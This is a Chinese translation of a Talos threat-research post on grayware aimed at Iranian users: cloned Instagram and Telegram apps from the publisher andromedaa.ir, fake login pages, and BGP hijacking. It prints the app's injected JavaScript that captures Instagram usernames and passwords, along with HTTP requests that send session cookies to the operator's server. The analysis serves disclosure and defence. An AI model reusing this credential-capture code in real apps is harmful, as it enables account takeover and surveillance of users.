本文翻译自：https://blog.talosintelligence.com/2018/11/persian-stalker.html
### 介绍
由国家所赞助的应用厂商拥有许多先进的技术用于社交媒体的远成访问以及在应用中进行安全的消息传递。从2017年开始到2018年之间，思科Talos已经发现了各种被用来窃取用户私人信息的应用技术。这些技术均使用了伪造的登录页面，并伪装为合法的应用程序以便实施BGP劫持。除此之外，他们的目标总是针对安全消息应用程序Telegram以及社交媒体网站Instagram的伊朗用户。
在伊朗，由于电报应用程序有将近4000万用户使用，所以他已经成为了伊朗灰色软件的攻击目标。虽然电报被用户用于进行日常的交流，但是许多国家政府抗议者用它来组织政府示威活动。尤其在2017年12月。在少数情况下，伊朗政府会要求电报关闭那些有可能激发“暴力”的专栏。自2017年以来，这种策略就开始实施，用于收集有关Telegram和Instagram用户的信息。而这些活动的复杂性，资源需求和方法各不相同。下面我们将概述一下网络攻击，应用程序克隆和经典网络钓鱼攻击的示例。我们相信，这些活动会针对伊朗用户并被用于窃取电报应用程序中的个人登录信息。
恶意程序被安装后，即使用户使用的是合法的Telegram应用程序，但其中一些克隆应用也会访问移动设备的完整联系人列表和消息。在使用伪造的Instagram应用程序的情况下，恶意软件将完整的会话数据发送回后端服务器，这也使得攻击者能够完全控制这些账户。这也表明这些用于软件的“灰色”性质。然而它暂时还不具备很高的恶意程度，所以不能被归类为恶意软件。但其可疑性值得我们进行关注。这种软件很难检测，因为它通常满足用户期望的功能（例如发送消息）。然而它仅有一次因为其他方面的恶意性而被安全研究员捕捉检测到。Talos最终发现了几款影响颇深的广告软件。我们相信此灰色软件很可能会给用户的隐私安全带来隐患。根据我们的研究，其中一些应用程序将数据发送回主机服务器，或者以某种方式从位于伊朗的IP地址进行远程控制，无论设备位于国内或者国外。
在伊朗的恶意攻击中，我们发现攻击者创建了虚假登录页面。尽管这不是一种先进的技术，但对于那些不了解网络安全的用户来说，它是有效的。
像“迷人的小猫”这样的伊朗联盟组织一直在使用这种技术，其目标是安全消息传递应用程序。 一些攻击者也在劫持设备的BGP协议。
该技术重定向所有路由器的流量，而设备不考虑这些新路由的原始路由。
为了劫持BGP，他们需要与互联网服务提供商（ISP）合作，但这种操作很容易被检测到，因此新的路由将会等待很长时间才能到位。
Talos并没有从这几次攻击中找到一个相关联的关系，但所有这些攻击都针对伊朗及其国民和Telegram应用程序。虽然这篇文章的重点是伊朗，但全球的移动用户仍然需要意识到，这些技术可以被任何国家，国家赞助厂商或威胁行为者使用。
这在伊朗和俄罗斯等国家更为普遍，在这些国家，Telegram等应用程序被禁止，为了复制Telegram的服务，开发人员创建出现在官方和非官方应用程序商店的克隆。
普通用户虽然无法对BGP劫持采取任何手段，但使用官方应用程序商店中的合法应用程序可降低风险。
同样的规则适用于克隆的应用程序，从不受信任的来源安装应用程序意味着用户必须承担一定程度的风险。
在这两种情况下，当应用程序是非官方的“增强版”并且它们在官方Google Play商店中可用，用于也要小心下载。
### 相关策略
#### andromedaa.ir相关描述
Talos确定了一家完全专注于伊朗市场的软件开发商。 出版商在iOS和Android平台上都使用“andromedaa.ir”这个名称。
它开发的软件旨在增加用户在Instagram等社交媒体网络上的曝光率，以及某些电报频道上的伊朗用户数量。
在查看网站，更具体地说是安装链接时，显然这些应用程序都没有在官方应用程序商店（谷歌或苹果）中发布，这可能是由于美国政府对伊朗实施的制裁。
andromedaa.ir域名已在PI:EMAIL电子邮件地址注册。
这是用于为克隆的Instagram和Telegram应用程序专门设计的电子邮件地址（请参阅下面的部分）。
Talos在分析与域andromedaa [.] com相关的whois信息后识别出各种域名，除了一个注册了相同的电话号码。
我们扫描了与上述域名相关的IP地址，这些域名显示了他们使用SSL证书的模式。
此SSL证书分析显示另一个域--flbgr [.] com - 其whois信息受隐私保护。
根据SSL证书中这些值的低关注程度，Talos将此域与高威胁行为相关联。其中域名flbgr [.]
com于2018年8月6日注册，这也是最近注册的域名，并将其解析为IP地址145.239.65 [.] 25。 Cisco
Farsight数据显示其他域也解析为相同的IP地址。
然后，Talos发现了一个SSL证书，其通用名称为followerbegir [.] ir，其中包含sha256哈希值。 我们还发现了另一种相似证书。
然而，证书中似乎有两个拼写错误：一个在公共名称字段“followbeg.ir”中，另一个在组织字段中，它被标识为“andromeda”，而不是andromedaa。
#### 剑桥环球学院的描述
Andromedaa.ir发布了iOS应用程序，但其是与剑桥环球学院有限公司签发的证书一同签署的。这是一家提供iOS开发服务的英国威尔士注册公司。
该公司由一名伊朗公民拥有，该公司在四个不同的国家拥有至少四家其他公司：英国，美国，土耳其和爱沙尼亚。 所有这些公司都共享相同的服务，提供类似内容的网页。
Google将网站mohajer.co.uk标记为网络钓鱼，这可能与此网站以及Mohajer.eu为英国，美国，加拿大，澳大利亚和欧洲经济区其他国家/地区提供签证服务有关。
#### 商业模型
所有andromedaa.ir应用程序都会通过增加特定电报频道中的喜欢，评论，关注者甚至用户数量来增加用户在Instagram或电报上的曝光率。所有这些操作都保证了只有伊朗用户才能执行。
同样的运营商也管理（见上一节）像lik3.org这样的网站，它们的销售情况同样被曝光。
虽然这些服务并非违法，但它们肯定是“灰色”服务。 在同一网站上，  
我们可以看到营销商大力宣传使用此服务的好处。
值得注意的是，运营商表示他们永远不会要求Instagram用户进行密码设置，因为他们所有的网站用户都是真实存在的，然而实际情况是，运营商不需要Instagram用户的客户密码，因为Instagram用户不需要登录用户的帐户来“喜欢”他们发送的帖子。
相反，运营商可以访问数千个用户会话。 他们可以访问已安装“免费”应用程序的用户，这意味着他们可以在这些会话期间做任何他们想做的事情。 虽然用户
对Telegram应用程序使用不同的操作，但这些方法也可能导致攻击者获得控制权。 有关详细信息，请参阅“应用程序示例”部分。
这里的危险并不是运营商通过此手法进行恶意赚钱活动，而是用户的隐私存在风险。对Instagram和Telegram帐户的控制方法使得攻击者能够问用户的完整联系人列表、Telegram上的未来消息以及用户的完整Instagram个人资料。
伊朗禁止使用这些网站，特别是电报，因为聊天可以加密，阻止政府访问。 通过使用这些方法，运营商监听未来用户的聊天内容。
虽然此应用的大部分后端都托管在欧洲的服务器中，但所有经过测试的应用程序都会对位于伊朗的服务器执行更新检查。
同样，这本身并不是恶意的，但考虑到禁用应用程序的内容可能使政府将访问数千个移动设备。 但是，Talos无法将此活动向运营商与政府实体建立直接关系。
### FOLLOWER BEGIR INSTAGRAM苹果应用
我们分析的第一个应用程序是为iOS设计的فالوئربگیراینستاگرام（“Follower Begir Instagram”）。
Andromedaa.ir提交了这个申请，并由剑桥环球学院签署。 此应用程序是Instagram的合作项目。
开发人员添加了一些功能，如虚拟货币和波斯语支持等。
该应用程序使用iOS WebKit框架来显示Web内容，并显示Instagram页面。
首次执行时，应用程序显示使用以下JavaScript代码段注入；来Instagram登录页面。
    document.addEventListener('click', function() { 
        try { 
            var tu = document.querySelector('[name="username"]'); 
            var tp = document.querySelector('[name="password"]'); 
            var tpV = (typeof tp == 'undefined') ? '' : tp.value; 
            var tuV = (typeof tu == 'undefined') ? '' : tu.value; 
        } catch (err) { 
            var tuV = ''; 
            var tpV = ''    } 
        var bd = document.getElementsByTagName('body')[0].innerText; 
        var messageToPost = { 
            'pu': tuV, 
            'pp': tpV, 
            'bd': bd 
        }; window.webkit.messageHandlers.buttonClicked.postMessage(messageToPost);}, false);
此代码的目的是在用户单击“连接”按钮时将控件提供给iOS应用程序。 应用程序接收相应事件、用户名和密码字段的值以及页面正文。
该事件由`followerbegir.AuthorizationUserController
userController：didReceiveScriptMessage（）`函数处理。 之后，应用程序在Instagram服务器上进行身份验证。
在此调查期间，我们发现密码未直接发送到后端服务器（v1 [.] flbgr [.] com）。 以下是发送到ping.php网页的数据：
    POST /users/ping.php?m=ios&access=[redacted]&apk=35&imei=[redacted]&user_details=[redacted]&tokenNumber=[redacted] HTTP/1.1 
    Host: v1.flbgr.com 
    SESSIONID: [redacted] 
    HEADER: vf1IOS: 3361ba9ec3480bcd3766e07cf6b4068a 
    Connection: close 
    Accept: */* 
    Accept-Language: fr-fr 
    User-Agent: %D9%81%D8%A7%D9%84%D9%88%D8%A6%D8%B1%20%D8%A8%DA%AF%D9%8A%D8%B1%20%D8%A7%DB%8C%D9%86%D8%B3%D8%AA%D8%A7%DA%AF%D8%B1%D8%A7%D9%85/35 CFNetwork/893.14.2 Darwin/17.3.0 
    Accept-Encoding: gzip, deflate 
    Content-Length: 0
如果帐户是私有的，则后端服务器的运营商接收移动类型（iOS），令牌和用户数据，例如用户名，个人资料图片和全名。
SESSIONID变量包含最敏感的信息：具有有效cookie的Instagram连接的标头。
服务器可以使用此字段中可用的信息劫持用户的Instagram会话。
与大多数基础设施不同，该应用程序具有相应的更新机制。 当应用程序启动时，它会向当前版本的应用程序发送一个请求到ndrm [.] ir：
    POST /start/fl.php?apk=35&m=ios HTTP/1.1 
    Host: ndrm.ir 
    HEADER: vf1 